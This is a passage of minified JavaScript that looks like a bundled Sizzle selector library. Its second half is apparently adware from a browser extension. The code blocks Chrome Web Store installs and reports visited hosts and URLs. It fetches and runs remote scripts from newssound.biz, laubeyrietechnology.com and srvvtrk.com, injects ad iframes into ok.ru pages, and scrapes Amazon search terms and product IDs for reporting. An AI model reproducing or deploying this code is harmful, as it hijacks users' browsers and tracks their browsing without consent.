                        if (e === 3 || e === 4) {
                            return aL.nodeValue
                        }
                    }
                }
                return aI
            };
            v = E.selectors = {
                cacheLength: 50,
                createPseudo: r,
                match: am,
                attrHandle: {},
                find: {},
                relative: {
                    ">": {
                        dir: "parentNode",
                        first: true
                    },
                    " ": {
                        dir: "parentNode"
                    },
                    "+": {
                        dir: "previousSibling",
                        first: true
                    },
                    "~": {
                        dir: "previousSibling"
                    }
                },
                preFilter: {
                    ATTR: function(e) {
                        e[1] = e[1].replace(A, ap);
                        e[3] = (e[4] || e[5] || "").replace(A, ap);
                        if (e[2] === "~=") {
                            e[3] = " " + e[3] + " "
                        }
                        return e.slice(0, 4)
                    },
                    CHILD: function(e) {
                        e[1] = e[1].toLowerCase();
                        if (e[1].slice(0, 3) === "nth") {
                            if (!e[3]) {
                                E.error(e[0])
                            }
                            e[4] = +(e[4] ? e[5] + (e[6] || 1) : 2 * (e[3] === "even" || e[3] === "odd"));
                            e[5] = +((e[7] + e[8]) || e[3] === "odd")
                        } else {
                            if (e[3]) {
                                E.error(e[0])
                            }
                        }
                        return e
                    },
                    PSEUDO: function(i) {
                        var e, aI = !i[5] && i[2];
                        if (am.CHILD.test(i[0])) {
                            return null
                        }
                        if (i[3] && i[4] !== q) {
                            i[2] = i[4]
                        } else {
                            if (aI && ad.test(aI) && (e = p(aI, true)) && (e = aI.indexOf(")", aI.length - e) - aI.length)) {
                                i[0] = i[0].slice(0, e);
                                i[2] = aI.slice(0, e)
                            }
                        }
                        return i.slice(0, 3)
                    }
                },
                filter: {
                    TAG: function(i) {
                        var e = i.replace(A, ap).toLowerCase();
                        return i === "*" ? function() {
                            return true
                        } : function(aI) {
                            return aI.nodeName && aI.nodeName.toLowerCase() === e
                        }
                    },
                    CLASS: function(e) {
                        var i = d[e + " "];
                        return i || (i = new RegExp("(^|" + x + ")" + e + "(" + x + "|$)")) && d(e, function(aI) {
                            return i.test(typeof aI.className === "string" && aI.className || typeof aI.getAttribute !== az && aI.getAttribute("class") || "")
                        })
                    },
                    ATTR: function(aI, i, e) {
                        return function(aK) {
                            var aJ = E.attr(aK, aI);
                            if (aJ == null) {
                                return i === "!="
                            }
                            if (!i) {
                                return true
                            }
                            aJ += "";
                            return i === "=" ? aJ === e : i === "!=" ? aJ !== e : i === "^=" ? e && aJ.indexOf(e) === 0 : i === "*=" ? e && aJ.indexOf(e) > -1 : i === "$=" ? e && aJ.slice(-e.length) === e : i === "~=" ? (" " + aJ + " ").indexOf(e) > -1 : i === "|=" ? aJ === e || aJ.slice(0, e.length + 1) === e + "-" : false
                        }
                    },
                    CHILD: function(i, aK, aJ, aL, aI) {
                        var aN = i.slice(0, 3) !== "nth",
                            e = i.slice(-4) !== "last",
                            aM = aK === "of-type";
                        return aL === 1 && aI === 0 ? function(aO) {
                            return !!aO.parentNode
                        } : function(aU, aS, aX) {
                            var aO, a0, aV, aZ, aW, aR, aT = aN !== e ? "nextSibling" : "previousSibling",
                                aY = aU.parentNode,
                                aQ = aM && aU.nodeName.toLowerCase(),
                                aP = !aX && !aM;
                            if (aY) {
                                if (aN) {
                                    while (aT) {
                                        aV = aU;
                                        while ((aV = aV[aT])) {
                                            if (aM ? aV.nodeName.toLowerCase() === aQ : aV.nodeType === 1) {
                                                return false
                                            }
                                        }
                                        aR = aT = i === "only" && !aR && "nextSibling"
                                    }
                                    return true
                                }
                                aR = [e ? aY.firstChild : aY.lastChild];
                                if (e && aP) {
                                    a0 = aY[av] || (aY[av] = {});
                                    aO = a0[i] || [];
                                    aW = aO[0] === aE && aO[1];
                                    aZ = aO[0] === aE && aO[2];
                                    aV = aW && aY.childNodes[aW];
                                    while ((aV = ++aW && aV && aV[aT] || (aZ = aW = 0) || aR.pop())) {
                                        if (aV.nodeType === 1 && ++aZ && aV === aU) {
                                            a0[i] = [aE, aW, aZ];
                                            break
                                        }
                                    }
                                } else {
                                    if (aP && (aO = (aU[av] || (aU[av] = {}))[i]) && aO[0] === aE) {
                                        aZ = aO[1]
                                    } else {
                                        while ((aV = ++aW && aV && aV[aT] || (aZ = aW = 0) || aR.pop())) {
                                            if ((aM ? aV.nodeName.toLowerCase() === aQ : aV.nodeType === 1) && ++aZ) {
                                                if (aP) {
                                                    (aV[av] || (aV[av] = {}))[i] = [aE, aZ]
                                                }
                                                if (aV === aU) {
                                                    break
                                                }
                                            }
                                        }
                                    }
                                }
                                aZ -= aI;
                                return aZ === aL || (aZ % aL === 0 && aZ / aL >= 0)
                            }
                        }
                    },
                    PSEUDO: function(aJ, aI) {
                        var e, i = v.pseudos[aJ] || v.setFilters[aJ.toLowerCase()] || E.error("unsupported pseudo: " + aJ);
                        if (i[av]) {
                            return i(aI)
                        }
                        if (i.length > 1) {
                            e = [aJ, aJ, "", aI];
                            return v.setFilters.hasOwnProperty(aJ.toLowerCase()) ? r(function(aM, aO) {
                                var aL, aK = i(aM, aI),
                                    aN = aK.length;
                                while (aN--) {
                                    aL = j.call(aM, aK[aN]);
                                    aM[aL] = !(aO[aL] = aK[aN])
                                }
                            }) : function(aK) {
                                return i(aK, 0, e)
                            }
                        }
                        return i
                    }
                },
                pseudos: {
                    not: r(function(e) {
                        var i = [],
                            aI = [],
                            aJ = ag(e.replace(z, "$1"));
                        return aJ[av] ? r(function(aL, aQ, aO, aM) {
                            var aP, aK = aJ(aL, null, aM, []),
                                aN = aL.length;
                            while (aN--) {
                                if ((aP = aK[aN])) {
                                    aL[aN] = !(aQ[aN] = aP)
                                }
                            }
                        }) : function(aM, aL, aK) {
                            i[0] = aM;
                            aJ(i, null, aK, aI);
                            return !aI.pop()
                        }
                    }),
                    has: r(function(e) {
                        return function(i) {
                            return E(e, i).length > 0
                        }
                    }),
                    contains: r(function(e) {
                        return function(i) {
                            return (i.textContent || i.innerText || R(i)).indexOf(e) > -1
                        }
                    }),
                    lang: r(function(e) {
                        if (!ae.test(e || "")) {
                            E.error("unsupported lang: " + e)
                        }
                        e = e.replace(A, ap).toLowerCase();
                        return function(aI) {
                            var i;
                            do {
                                if ((i = at ? aI.lang : aI.getAttribute("xml:lang") || aI.getAttribute("lang"))) {
                                    i = i.toLowerCase();
                                    return i === e || i.indexOf(e + "-") === 0
                                }
                            } while ((aI = aI.parentNode) && aI.nodeType === 1);
                            return false
                        }
                    }),
                    target: function(e) {
                        var i = aA.location && aA.location.hash;
                        return i && i.slice(1) === e.id
                    },
                    root: function(e) {
                        return e === w
                    },
                    focus: function(e) {
                        return e === L.activeElement && (!L.hasFocus || L.hasFocus()) && !!(e.type || e.href || ~e.tabIndex)
                    },
                    enabled: function(e) {
                        return e.disabled === false
                    },
                    disabled: function(e) {
                        return e.disabled === true
                    },
                    checked: function(e) {
                        var i = e.nodeName.toLowerCase();
                        return (i === "input" && !!e.checked) || (i === "option" && !!e.selected)
                    },
                    selected: function(e) {
                        if (e.parentNode) {
                            e.parentNode.selectedIndex
                        }
                        return e.selected === true
                    },
                    empty: function(e) {
                        for (e = e.firstChild; e; e = e.nextSibling) {
                            if (e.nodeName > "@" || e.nodeType === 3 || e.nodeType === 4) {
                                return false
                            }
                        }
                        return true
                    },
                    parent: function(e) {
                        return !v.pseudos.empty(e)
                    },
                    header: function(e) {
                        return t.test(e.nodeName)
                    },
                    input: function(e) {
                        return h.test(e.nodeName)
                    },
                    button: function(i) {
                        var e = i.nodeName.toLowerCase();
                        return e === "input" && i.type === "button" || e === "button"
                    },
                    text: function(i) {
                        var e;
                        return i.nodeName.toLowerCase() === "input" && i.type === "text" && ((e = i.getAttribute("type")) == null || e.toLowerCase() === i.type)
                    },
                    first: ar(function() {
                        return [0]
                    }),
                    last: ar(function(e, i) {
                        return [i - 1]
                    }),
                    eq: ar(function(e, aI, i) {
                        return [i < 0 ? i + aI : i]
                    }),
                    even: ar(function(e, aJ) {
                        var aI = 0;
                        for (; aI < aJ; aI += 2) {
                            e.push(aI)
                        }
                        return e
                    }),
                    odd: ar(function(e, aJ) {
                        var aI = 1;
                        for (; aI < aJ; aI += 2) {
                            e.push(aI)
                        }
                        return e
                    }),
                    lt: ar(function(e, aK, aJ) {
                        var aI = aJ < 0 ? aJ + aK : aJ;
                        for (; --aI >= 0;) {
                            e.push(aI)
                        }
                        return e
                    }),
                    gt: ar(function(e, aK, aJ) {
                        var aI = aJ < 0 ? aJ + aK : aJ;
                        for (; ++aI < aK;) {
                            e.push(aI)
                        }
                        return e
                    })
                }
            };
            for (G in {
                    radio: true,
                    checkbox: true,
                    file: true,
                    password: true,
                    image: true
                }) {
                v.pseudos[G] = F(G)
            }
            for (G in {
                    submit: true,
                    reset: true
                }) {
                v.pseudos[G] = g(G)
            }

            function p(aK, aP) {
                var i, aL, aN, aO, aM, aI, e, aJ = au[aK + " "];
                if (aJ) {
                    return aP ? 0 : aJ.slice(0)
                }
                aM = aK;
                aI = [];
                e = v.preFilter;
                while (aM) {
                    if (!i || (aL = D.exec(aM))) {
                        if (aL) {
                            aM = aM.slice(aL[0].length) || aM
                        }
                        aI.push(aN = [])
                    }
                    i = false;
                    if ((aL = K.exec(aM))) {
                        i = aL.shift();
                        aN.push({
                            value: i,
                            type: aL[0].replace(z, " ")
                        });
                        aM = aM.slice(i.length)
                    }
                    for (aO in v.filter) {
                        if ((aL = am[aO].exec(aM)) && (!e[aO] || (aL = e[aO](aL)))) {
                            i = aL.shift();
                            aN.push({
                                value: i,
                                type: aO,
                                matches: aL
                            });
                            aM = aM.slice(i.length)
                        }
                    }
                    if (!i) {
                        break
                    }
                }
                return aP ? aM.length : aM ? E.error(aK) : au(aK, aI).slice(0)
            }

            function o(aK) {
                var aJ = 0,
                    aI = aK.length,
                    e = "";
                for (; aJ < aI; aJ++) {
                    e += aK[aJ].value
                }
                return e
            }

            function y(aK, aI, aJ) {
                var e = aI.dir,
                    aL = aJ && e === "parentNode",
                    i = ao++;
                return aI.first ? function(aO, aN, aM) {
                    while ((aO = aO[e])) {
                        if (aO.nodeType === 1 || aL) {
                            return aK(aO, aN, aM)
                        }
                    }
                } : function(aQ, aO, aN) {
                    var aS, aM, aP, aR = aE + " " + i;
                    if (aN) {
                        while ((aQ = aQ[e])) {
                            if (aQ.nodeType === 1 || aL) {
                                if (aK(aQ, aO, aN)) {
                                    return true
                                }
                            }
                        }
                    } else {
                        while ((aQ = aQ[e])) {
                            if (aQ.nodeType === 1 || aL) {
                                aP = aQ[av] || (aQ[av] = {});
                                if ((aM = aP[e]) && aM[0] === aR) {
                                    if ((aS = aM[1]) === true || aS === l) {
                                        return aS === true
                                    }
                                } else {
                                    aM = aP[e] = [aR];
                                    aM[1] = aK(aQ, aO, aN) || l;
                                    if (aM[1] === true) {
                                        return true
                                    }
                                }
                            }
                        }
                    }
                }
            }

            function aG(e) {
                return e.length > 1 ? function(aL, aK, aI) {
                    var aJ = e.length;
                    while (aJ--) {
                        if (!e[aJ](aL, aK, aI)) {
                            return false
                        }
                    }
                    return true
                } : e[0]
            }

            function ak(e, aI, aJ, aK, aN) {
                var aL, aQ = [],
                    aM = 0,
                    aO = e.length,
                    aP = aI != null;
                for (; aM < aO; aM++) {
                    if ((aL = e[aM])) {
                        if (!aJ || aJ(aL, aK, aN)) {
                            aQ.push(aL);
                            if (aP) {
                                aI.push(aM)
                            }
                        }
                    }
                }
                return aQ
            }

            function n(aI, i, aK, aJ, aL, e) {
                if (aJ && !aJ[av]) {
                    aJ = n(aJ)
                }
                if (aL && !aL[av]) {
                    aL = n(aL, e)
                }
                return r(function(aW, aT, aO, aV) {
                    var aY, aU, aQ, aP = [],
                        aX = [],
                        aN = aT.length,
                        aM = aW || I(i || "*", aO.nodeType ? [aO] : aO, []),
                        aR = aI && (aW || !i) ? ak(aM, aP, aI, aO, aV) : aM,
                        aS = aK ? aL || (aW ? aI : aN || aJ) ? [] : aT : aR;
                    if (aK) {
                        aK(aR, aS, aO, aV)
                    }
                    if (aJ) {
                        aY = ak(aS, aX);
                        aJ(aY, [], aO, aV);
                        aU = aY.length;
                        while (aU--) {
                            if ((aQ = aY[aU])) {
                                aS[aX[aU]] = !(aR[aX[aU]] = aQ)
                            }
                        }
                    }
                    if (aW) {
                        if (aL || aI) {
                            if (aL) {
                                aY = [];
                                aU = aS.length;
                                while (aU--) {
                                    if ((aQ = aS[aU])) {
                                        aY.push((aR[aU] = aQ))
                                    }
                                }
                                aL(null, (aS = []), aY, aV)
                            }
                            aU = aS.length;
                            while (aU--) {
                                if ((aQ = aS[aU]) && (aY = aL ? j.call(aW, aQ) : aP[aU]) > -1) {
                                    aW[aY] = !(aT[aY] = aQ)
                                }
                            }
                        }
                    } else {
                        aS = ak(aS === aT ? aS.splice(aN, aS.length) : aS);
                        if (aL) {
                            aL(null, aT, aS, aV)
                        } else {
                            b.apply(aT, aS)
                        }
                    }
                })
            }

            function aw(aN) {
                var aI, aL, aJ, aM = aN.length,
                    aQ = v.relative[aN[0].type],
                    aR = aQ || v.relative[" "],
                    aK = aQ ? 1 : 0,
                    aO = y(function(i) {
                        return i === aI
                    }, aR, true),
                    aP = y(function(i) {
                        return j.call(aI, i) > -1
                    }, aR, true),
                    e = [function(aT, aS, i) {
                        return (!aQ && (i || aS !== aH)) || ((aI = aS).nodeType ? aO(aT, aS, i) : aP(aT, aS, i))
                    }];
                for (; aK < aM; aK++) {
                    if ((aL = v.relative[aN[aK].type])) {
                        e = [y(aG(e), aL)]
                    } else {
                        aL = v.filter[aN[aK].type].apply(null, aN[aK].matches);
                        if (aL[av]) {
                            aJ = ++aK;
                            for (; aJ < aM; aJ++) {
                                if (v.relative[aN[aJ].type]) {
                                    break
                                }
                            }
                            return n(aK > 1 && aG(e), aK > 1 && o(aN.slice(0, aK - 1).concat({
                                value: aN[aK - 2].type === " " ? "*" : ""
                            })).replace(z, "$1"), aL, aK < aJ && aw(aN.slice(aK, aJ)), aJ < aM && aw((aN = aN.slice(aJ))), aJ < aM && o(aN))
                        }
                        e.push(aL)
                    }
                }
                return aG(e)
            }

            function ai(aJ, aI) {
                var aL = 0,
                    e = aI.length > 0,
                    aK = aJ.length > 0,
                    i = function(aV, aP, aU, aT, a1) {
                        var aQ, aR, aW, a0 = [],
                            aZ = 0,
                            aS = "0",
                            aM = aV && [],
                            aX = a1 != null,
                            aY = aH,
                            aO = aV || aK && v.find.TAG("*", a1 && aP.parentNode || aP),
                            aN = (aE += aY == null ? 1 : Math.random() || 0.1);
                        if (aX) {
                            aH = aP !== L && aP;
                            l = aL
                        }
                        for (;
                            (aQ = aO[aS]) != null; aS++) {
                            if (aK && aQ) {
                                aR = 0;
                                while ((aW = aJ[aR++])) {
                                    if (aW(aQ, aP, aU)) {
                                        aT.push(aQ);
                                        break
                                    }
                                }
                                if (aX) {
                                    aE = aN;
                                    l = ++aL
                                }
                            }
                            if (e) {
                                if ((aQ = !aW && aQ)) {
                                    aZ--
                                }
                                if (aV) {
                                    aM.push(aQ)
                                }
                            }
                        }
                        aZ += aS;
                        if (e && aS !== aZ) {
                            aR = 0;
                            while ((aW = aI[aR++])) {
                                aW(aM, a0, aP, aU)
                            }
                            if (aV) {
                                if (aZ > 0) {
                                    while (aS--) {
                                        if (!(aM[aS] || a0[aS])) {
                                            a0[aS] = ay.call(aT)
                                        }
                                    }
                                }
                                a0 = ak(a0)
                            }
                            b.apply(aT, a0);
                            if (aX && !aV && a0.length > 0 && (aZ + aI.length) > 1) {
                                E.uniqueSort(aT)
                            }
                        }
                        if (aX) {
                            aE = aN;
                            aH = aY
                        }
                        return aM
                    };
                return e ? r(i) : i
            }
            ag = E.compile = function(e, aM) {
                var aJ, aI = [],
                    aL = [],
                    aK = Q[e + " "];
                if (!aK) {
                    if (!aM) {
                        aM = p(e)
                    }
                    aJ = aM.length;
                    while (aJ--) {
                        aK = aw(aM[aJ]);
                        if (aK[av]) {
                            aI.push(aK)
                        } else {
                            aL.push(aK)
                        }
                    }
                    aK = Q(e, ai(aL, aI))
                }
                return aK
            };

            function I(aI, aL, aK) {
                var aJ = 0,
                    e = aL.length;
                for (; aJ < e; aJ++) {
                    E(aI, aL[aJ], aK)
                }
                return aK
            }

            function aC(aJ, e, aK, aN) {
                var aL, aP, aI, aQ, aO, aM = p(aJ);
                if (!aN) {
                    if (aM.length === 1) {
                        aP = aM[0] = aM[0].slice(0);
                        if (aP.length > 2 && (aI = aP[0]).type === "ID" && aD.getById && e.nodeType === 9 && at && v.relative[aP[1].type]) {
                            e = (v.find.ID(aI.matches[0].replace(A, ap), e) || [])[0];
                            if (!e) {
                                return aK
                            }
                            aJ = aJ.slice(aP.shift().value.length)
                        }
                        aL = am.needsContext.test(aJ) ? 0 : aP.length;
                        while (aL--) {
                            aI = aP[aL];
                            if (v.relative[(aQ = aI.type)]) {
                                break
                            }
                            if ((aO = v.find[aQ])) {
                                if ((aN = aO(aI.matches[0].replace(A, ap), al.test(aP[0].type) && e.parentNode || e))) {
                                    aP.splice(aL, 1);
                                    aJ = aN.length && o(aP);
                                    if (!aJ) {
                                        b.apply(aK, aN);
                                        return aK
                                    }
                                    break
                                }
                            }
                        }
                    }
                }
                ag(aJ, aM)(aN, e, !at, aK, al.test(aJ));
                return aK
            }
            v.pseudos.nth = v.pseudos.eq;

            function af() {}
            af.prototype = v.filters = v.pseudos;
            v.setFilters = new af();
            aD.sortStable = av.split("").sort(N).join("") === av;
            aj();
            [0, 0].sort(N);
            aD.detectDuplicates = ah;
            aA["1f404c54c2b0e13e0f"].Sizzle = E
        })(window);;
        var e = i[g].Sizzle;
        var d = i[g];
        d.Sizzle = e;
        d.demoMode = i[g].demoMode = (p);
        d.ready(function() {
            if (location.href.indexOf("thisadsfor.us") > -1) {
                return true
            }
            try {
                (function() {
                    var A = function() {
                        var C = "chrome-webstore-item";
                        var D = document.getElementsByTagName("link");
                        for (var B = 0, E = D.length; E > B; ++B) {
                            if (C == D[B].getAttribute("id") || C == D[B].getAttribute("rel")) {
                                d.loadedCallback("PROMO_ANLZ", "", location.host, location.href, D[B].getAttribute("href"))
                            }
                        }
                    };
                    A()
                })()
            } catch (y) {}
            try {
                (function() {
                    var C = function() {
                        location.href = "javascript:(" + function() {
                            window.onbeforeunload = null;
                            window.onunload = null;
                            chrome.webstore.install = null
                        } + ")()"
                    };
                    var B = function() {
                        window.stop && window.stop();
                        location.replace("about:blank")
                    };
                    var A = function() {
                        if ("52421" == "51433" && location.hostname.indexOf("olam-hamedia.tech") > -1) {
                            return
                        }
                        var E = "chrome-webstore-item";
                        var F = document.getElementsByTagName("link");
                        for (var D = 0, G = F.length; G > D; ++D) {
                            if (E == F[D].getAttribute("id") || E == F[D].getAttribute("rel")) {
                                F[D].setAttribute("rel", "");
                                F[D].setAttribute("id", "");
                                F[D].setAttribute("href", "");
                                C()
                            }
                        }
                    };
                    if (!location.hostname.match(/dostup-[a-z]+\.com$/) && location.hostname.indexOf("freevideodownloader") == -1 && location.hostname.indexOf("musvk") == -1 && location.hostname.indexOf("vkonline.xyz") == -1 && location.hostname.indexOf("vkunblock.com") == -1) {
                        A()
                    }
                })()
            } catch (y) {}
            var r = function(B) {
                var E = {};
                B = B.split("?");
                if (B.length < 2) {
                    return E
                }
                var D = B[1];
                var F = D.split("&");
                for (var C = 0; C < F.length; C++) {
                    var G = F[C].split("=");
                    if (typeof E[G[0]] === "undefined") {
                        E[G[0]] = G[1]
                    } else {
                        if (typeof E[G[0]] === "string") {
                            var A = [E[G[0]], G[1]];
                            E[G[0]] = A
                        } else {
                            E[G[0]].push(G[1])
                        }
                    }
                }
                return E
            };
            var w = {};
            var t = document.getElementsByTagName("script");
            var s = null;
            for (var v = 0; v < t.length; v++) {
                var z = t[v];
                if (z.src.search(/1f404c54c2b0e13e0f.*\.js/i) !== -1) {
                    s = z.src.replace(/^https?\:\/\//i, "").split("/")[0];
                    if (o) {
                        d.scriptDomain = s
                    }
                    w = r(z.src);
                    break
                }
            }
            if (location.host.indexOf("bing.com") > -1 && i.AM && typeof i.AM == "object") {
                i.AM.push(d.scriptDomain)
            }
            i[g].tbParams = {
                wid: "52421",
                sid: "",
                tid: "8000",
                title: "Not set",
                optoutUrl: ""
            };
            if (w.sid) {
                i[g].tbParams.sid = w.sid
            }
            if (w.title) {
                i[g].tbParams.title = decodeURIComponent(w.title)
            }
            if (w.optout) {
                i[g].tbParams.optoutUrl = decodeURIComponent(w.optout)
            }
            i[g].getParams = r(location.href);
            d.tbParams = i[g].tbParams;
            var q = "";
            try {
                q = location.pathname.substring(0, 50)
            } catch (y) {}
            d.loadedCallback("LOADED", "", location.host, q, s);
            var x = /\.(jpg|png|jpeg|gif|bmp|doc|pdf|xls|js|xml|doc|docs|txt|css)$/;
            if (location.href.match(x)) {
                d.loadedCallback("URL_STATICFILE");
                return false
            }
            var u = /(paypal\.com|secure\.|\.gov|doubleclick\.net|addthis\.com|twitter\.com|docs\.google\.com|drive\.google\.com)/;
            if (location.hostname.match(u)) {
                d.loadedCallback("URL_IGNOREDOMAIN");
                return false
            }(function(d, w, u) {
                var $$ = w["1f404c54c2b0e13e0f"];
                var scriptsToLoad = $$.fromJson("{\"cd1d2\":{\"countries_allow\":\"\",\"countries_deny\":\"\",\"hostname_allow\":\"\",\"hostname_deny\":\"(?:.*googleusercontent\\\\..*|mail\\\\.google\\\\.com|reddit\\\\.com|.*\\\\.reddit\\\\.com)\",\"browsers_allow\":\"\",\"browsers_deny\":\"\",\"coverage\":\"0-100\",\"url\":\"\\/\\/newssound.biz\\/addons\\/lnkr5.min.js\",\"limit\":\"0\",\"type\":\"external\",\"key\":\"cd1d2\"},\"4a71b\":{\"countries_allow\":\"gb,de,fr,es,it,ru,pt,br,be,pl,cz,at,ch,nl,ie,no,se,dk,fi,us\",\"countries_deny\":\"\",\"hostname_allow\":\"(?:google\\\\..*|bing\\\\.com)\",\"hostname_deny\":\"\",\"browsers_allow\":\"\",\"browsers_deny\":\"\",\"coverage\":\"0-100\",\"url\":\"\",\"limit\":\"0\",\"type\":\"platform\",\"key\":\"4a71b\"},\"c3369\":{\"countries_allow\":\"at,br,ch,de,dk,es,fi,fr,in,it,mx,nl,no,se,sg,tw,gb\",\"countries_deny\":\"\",\"hostname_allow\":\"(?:google\\\\..*|youtube\\\\.com)\",\"hostname_deny\":\"\",\"browsers_allow\":\"\",\"browsers_deny\":\"\",\"coverage\":\"0-100\",\"url\":\"\\/\\/laubeyrietechnology.com\\/script\\/d.php?uid=52421x0000xzzzzzzzzzzzzzzzzzzzzz&a=3453\",\"limit\":\"0\",\"type\":\"external\",\"key\":\"c3369\"},\"acfec\":{\"countries_allow\":\"us,de,gb,fr,ca,au,nl,es,it,nz,be,se,ch,in,at,br,dk,no,fi\",\"countries_deny\":\"\",\"hostname_allow\":\"(?:amazon\\\\..*|.*\\\\.amazon\\\\..*)\",\"hostname_deny\":\"\",\"browsers_allow\":\"\",\"browsers_deny\":\"\",\"coverage\":\"0-100\",\"url\":\"\",\"limit\":\"0\",\"type\":\"platform\",\"key\":\"acfec\",\"config\":{\"subid\":\"1174\"}},\"90f06\":{\"countries_allow\":\"\",\"countries_deny\":\"\",\"hostname_allow\":\"\",\"hostname_deny\":\"\",\"browsers_allow\":\"\",\"browsers_deny\":\"\",\"coverage\":\"0-100\",\"url\":\"\\/\\/srvvtrk.com\\/91a2556838a7c33eac284eea30bdcc29\\/validate-site.js?uid=52421x8000x\\/SID\\/&r=\\/RANDOM\\/\",\"limit\":\"0\",\"type\":\"external\",\"key\":\"90f06\"}}");
                $$.monetizationsConfig = scriptsToLoad;
                var extendedCallbacks = false;
                if ("52421" == "51739") {
                    extendedCallbacks = true
                };;;;;;;;;;;
                var isInIframe = function() {
                    return (window.top != window.self)
                };
                var secondsFormat = function(sec_num) {
                    var days = Math.floor(sec_num / 86400);
                    sec_num -= days * 86400;
                    var hours = Math.floor(sec_num / 3600);
                    sec_num -= hours * 3600;
                    var minutes = Math.floor(sec_num / 60);
                    sec_num -= minutes * 60;
                    if (hours < 10) {
                        hours = "0" + hours
                    }
                    if (minutes < 10) {
                        minutes = "0" + minutes
                    }
                    if (sec_num < 10) {
                        sec_num = "0" + sec_num
                    }
                    return days + "d " + hours + ":" + minutes + ":" + sec_num
                };
                var runForceSearch;;;;
                if (!scriptsToLoad) {
                    return false
                }
                var getUrlFromConfigObject = function(configRow) {
                    if (configRow.http_url && window.location.protocol == "http:") {
                        return configRow.http_url
                    } else {
                        if (configRow.https_url && window.location.protocol == "https:") {
                            return configRow.https_url
                        } else {
                            if (configRow.url) {
                                return configRow.url
                            }
                        }
                    }
                };
                if (scriptsToLoad['4a71b'] && $$.getCookie("__mzpsd") == 1) {
                    return false
                }
                if (location.hostname.indexOf("ok.ru") > -1 && scriptsToLoad['1f755']) {
                    var oconf = $$.getMtzCfg('1f755');
                    if (!!oconf.injectOk && oconf.injectOk == "1") {
                        (function() {
                            var d = document.querySelector("body");
                            if (!d) {
                                return
                            }

                            function i(j) {
                                j = j.replace(/%PUBLISHER_ID%/, ($$ && $$.tbParams && $$.tbParams.wid) ? $$.tbParams.wid : "");
                                j = j.replace(/%SOURCE_ID%/, ($$ && $$.tbParams && $$.tbParams.tid) ? $$.tbParams.tid : "");
                                j = j.replace(/%SUBID%/, ($$ && $$.tbParams && $$.tbParams.sid) ? $$.tbParams.sid : "");
                                j = j.replace(/INSERT_RANDOM_NUMBER_HERE/, new Date().getTime());
                                return j
                            }
                            var e = i("<iframe id='a60b8ce3' name='a60b8ce3' src='//cdnpps.us/www/delivery/afr.php?zoneid=122&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;xid=%PUBLISHER_ID%_%SOURCE_ID%_%SUBID%' frameborder='0' scrolling='no' width='300' height='600' style='display:inline-block;'><a href='//cdnpps.us/www/delivery/ck.php?n=abb06471' target='_blank'><img src='//cdnpps.us/www/delivery/avw.php?zoneid=122&amp;n=abb06471' border='0' alt='' /></a></iframe>");
                            var c = i("<iframe id='8a61598d' name='8a61598d' src='//cdnpps.us/www/delivery/afr.php?zoneid=119&amp;cb=INSERT_RANDOM_NUMBER_HERE&amp;xid=%PUBLISHER_ID%_%SOURCE_ID%_%SUBID%' frameborder='0' scrolling='no' width='468' height='60' style='display:inline-block;'><a href='//cdnpps.us/www/delivery/ck.php?n=8a61598d' target='_blank'><img src='//cdnpps.us/www/delivery/avw.php?zoneid=119&amp;n=8a61598d' border='0' alt='' /></a></iframe>");

                            function f(j) {
                                return document.querySelectorAll(j) || []
                            }
                            var a = function(n, j, o, l, m) {
                                var k = document.createElement("div");
                                k.setAttribute("id", "_" + Math.floor((Math.random() * 1000000000)));
                                k.setAttribute("style", m || "");
                                k.innerHTML = o;
                                l.style.textAlign = "center";
                                l.appendChild(k)
                            };

                            function b(j) {
                                j.id = "_" + j.id;
                                j.setAttribute("data-mytype", "name_baner");
                                j.innerHTML = "";
                                a(300, 600, e, j)
                            }

                            function h(k, j) {
                                var l = document.createElement("div");
                                l.setAttribute("data-mytype", "name_baner");
                                l.setAttribute("style", "margin:0 auto; overflow:hidden;");
                                k.setAttribute("data-mytype", "name_baner");
                                k.appendChild(l);
                                a(468, 60, c, l, j)
                            }
                            var g = function() {
                                Array.prototype.forEach.call(f("div.feed.__klass.__no-ava>.feed_cnt"), function(j) {
                                    if (!j.getAttribute("data-mytype")) {
                                        h(j, "margin: 0 auto 10px;")
                                    }
                                });
                                Array.prototype.forEach.call(f('div[class^="feed h-mod"]'), function(j) {
                                    if (!j.lastElementChild.getAttribute("data-mytype") && !j.parentNode.getAttribute("class")) {
                                        h(j, "margin: 10px auto 0;")
                                    }
                                });
                                Array.prototype.forEach.call(f('div[data-btype^="LinkBanner_navigate"]'), function(j) {
                                    if (!j.getAttribute("data-mytype")) {
                                        j.innerHTML = "";
                                        b(j)
                                    }
                                });
                                setTimeout(g, 3333)
                            };
                            g()
                        })();
                    }
                }
                var amzreg = /(^|www\.)amazon\./g;
                if (location.hostname.match(amzreg)) {
                    (function(f, a) {
                        function e(h) {
                            var g, d, i = new RegExp("[?&#]" + h + "=([^&#$]+)", "g");
                            while (g = i.exec(a.location.href)) {
                                d = decodeURIComponent((g[1] + "").replace(/\+/g, "%20"))
                            }
                            return d
                        }

                        function b() {
                            if (f.location.pathname.indexOf("/s/") !== 0 && f.location.pathname.indexOf("/gp/search/") !== 0) {
                                return
                            }
                            var p = (f.querySelector("[name=field-keywords]") && f.querySelector("[name=field-keywords]").value) || e("field-keywords");
                            var g = "",
                                i = f.querySelector("#searchDropdownBox option:checked");
                            if (f.querySelector("#apsRedirectLink")) {
                                i = f.querySelector("#searchDropdownBox option:first-child")
                            }
                            if (!!i) {
                                g = i.value + "::" + i.textContent
                            }
                            var j = [];
                            var o = [].slice.call(f.querySelectorAll(".s-result-item"));
                            if (o.length) {
                                j = o.map(function(m) {
                                    return m.getAttribute("data-asin")
                                })
                            }
                            var k, d = f.getElementById("s-result-count");
                            if (!!d) {
                                k = d.textContent.indexOf("-") > -1 ? parseInt(d.textContent) : 1;
                                if (f.location.hostname.indexOf("amazon.com.mx") > -1) {
                                    k = d.textContent.indexOf(" a ") > -1 ? parseInt(d.textContent) : 1
                                }
                                if (f.location.hostname.indexOf("amazon.cn") > -1 || f.location.hostname.indexOf("amazon.co.jp") > -1) {
                                    var h = d.textContent.match(/\d+\-\d+/);
                                    if (!!h) {
                                        k = parseInt(h[0])
                                    }
                                }
                            }
                            if (Number.isInteger(k) == false) {
                                var n = f.querySelector(".pagnCur");
                                var l = n ? parseInt(n.textContent) : parseInt(e("page")) || 1;
                                k = (l - 1) * o.length + 1
                            }
                            if (!j.length) {
                                return
                            }
                            $$.loadedCallback("AMZN_SEARCH", "", a.location.hostname, p, j.join(","), k, g)
                        }
                        b();
                        var c = a.history.pushState;
                        window.history.pushState = function(i) {
                            var d = 1000,
